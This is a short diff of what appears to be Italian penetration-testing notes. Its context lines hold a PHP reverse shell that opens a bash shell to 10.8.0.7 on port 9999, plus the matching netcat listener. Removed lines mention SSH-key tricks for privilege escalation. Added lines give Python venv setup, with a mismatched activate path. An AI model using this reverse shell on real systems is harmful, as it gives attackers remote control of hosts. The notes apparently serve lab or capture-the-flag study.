@@ -459,9 +459,9 @@ $s=fsockopen("10.8.0.7",9999);
 proc_open("/bin/bash",[$s,$s,$s],$p);
 ?>
 ```
-`nc 9999 -lvnp`
+`nc 9999 -lvnp` 
+###### Usare una `venv` in linux
 
-###### Chiavi ssh Mettilo in privesc
-- aggiungi exploit con chiave ssh pubblica, la carichi e poi puoi accedere con la tua privata
-- aggiungi exploit dove prendi la chiave ssh privata e puoi accedere con la tua macchina 
-###### Usare una venv in linux
+`python3 -m venv venv`
+
+`source .venv/bin/activate`
